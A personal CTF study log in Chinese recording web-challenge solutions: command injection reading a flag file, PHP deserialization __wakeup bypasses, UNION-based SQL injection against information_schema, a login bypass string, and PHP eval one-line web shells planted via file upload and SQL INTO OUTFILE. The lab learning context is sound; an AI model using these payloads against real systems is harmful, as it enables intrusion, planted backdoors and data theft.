# Levivan.github.io
学习记录
2026.1.8
1.登录
随便登入
bp抓包（输入账号密码后）
intruder爆破寻找长度不一样的
repeater go
2.php代码
弱类型比较
$a==$b等于
$a===$b全等
3.robot
url后输入/robots.txt
4.ping没写waf
command1 && command2 先执行 command1，如果为真，再执行command2 
command1 | command2   只执行 command2 
command1 & command2   先执行command2后执行command1 
command1 || command2  先执行 command1，如果为假，再执行command2 
命令执行漏洞（| || & && 称为 管道符） 
127.0.0.1&&ls
./返回上一级目录
cat命令127.0.0.1 && cat ../../../../home/flag.txt
5.请求头
php尝试index.php,F12查看network看请求头
或者bp抓包送到repeater
6.伪造xff（X-Forwarded-For）和referer
插件改请求头或者bp抓包改请求头和ip
7.常见的备份文件后缀名：.git .svn .swp .~ .bak .bash_history加在路由后面
8.URI/目录（index.php）
9.get请求以？为分割符，以&为并列请求
  post请求 requests.post(url,data)
10.js
出现以逗号隔开的数字
python将其翻译为ASCII码
s=[55,56,54,79,115,69,114,116,107,49,50]
for i in s:
print(chr(i),end=")
2026.1.9
1.php2
php相关现在url后先添加index.php，没有区别尝试index.phps(源代码)
url解码：%+ASCII的十六进制
例一：%25  ：25就是十六进制的 % ，整个解码就是 % 
例二：%61 ：61是十六进制的a : 整个解码就是 a 
构造payload ： http://111.198.29.45:48961/?id=%2561dmin 
%25 通过url栏变成%，%61通过urldecode变成a，配合成id=admin
2.ics06
只有报表中心可以打开，url显示id=1无法修改，bp抓包爆破,找到明显长度不同的payload2333，id改为2333
3.php的序列化与反序列化
绕过_wakeup（）函数
<?php
class xctf{                      //定义一个名为xctf的类
public $flag = '111';            //定义一个公有的类属性$flag，值为111
public function __wakeup(){      //定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本
exit('bad requests');
}
}
$test = new xctf();           //使用new运算符来实例化该类（xctf）的对象为test
echo(serialize($test));       //输出被序列化的对象（test）
?>
输出O:4:"xctf":1:{s:4:"flag";s:3:"111";}
要绕过_wakeup(),修改1为2
4.php_rce
thinkphp漏洞*
5.php的文件包含类型
审计php代码,while函数根据page参数来判断php文件是否存在，如果存在此文件，则进行文件包含。
御剑扫描进入sql注入区域编辑一句话木马select "<?php eval($_POST[aaaa]);?>"  into ourfile '/tmp/yihua.php' 
打开中国蚁剑输入url和密码发现flag
2026.1.10
1.upload
浏览器绕过验证，一句话木马脚本php:<?php@eval($_POST['chopper']);?>
bp抓包后修改jpg后缀改为php
链接菜刀输入url地址找到flag
2.warmup
一张图片打开f12发现<!--source.php-->，访问source.php,发现需要访问hint.php
访问后出现提示flag not here, and flag in ffffllllaaaagggg
构造payload满足代码条件即file=hint.php
访问上一个文件目录，直到找到ffffllllaaaagggg（五个if回退6次）
执行查看文件ffffllllaaaagggg的命令找到flag
3.sql注入
猜字段1' union select 1,2,3# 
爆破数据库名1' union select 1,database(),3# 返回3
爆破表名1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema="news"# 
爆破列名1' union select 1, group_concat(column_name),3 from information_schema.columns where table_name="secret_table" # 
出现flag提示  读取数据1' union select 1,fl4g,3 from secret_table# 
4.php反序列化
魔术方法_wakeup()  使用unserialize()函数反序列化一个对象
构造payload注意base64解码  绕过wakeup
<?php 
class Demo {  
    private $file = 'index.php'; 
    public function __construct($file) {  
        $this->file = $file;  
    } 
    function __destruct() {  
        echo @highlight_file($this->file, true);  
    } 
    function __wakeup() {  
        if ($this->file != 'index.php') {  
            //the secret is in the fl4g.php 
            $this->file = 'index.php';  
        }  
    }  
} 
$flag = new Demo('fl4g.php'); 
$flag = serialize($flag); 
$flag = str_replace('O:4', 'O:+4',$flag); // 绕过正则 
$flag = str_replace(':1:', ':2:' ,$flag);  //绕过wakeup
echo base64_encode($flag);   //对参数进行base编码 
?>
传递var参数
5.inget（sql注入）
构造payload 
先尝试万能密码id=' or ''='直接给了flag
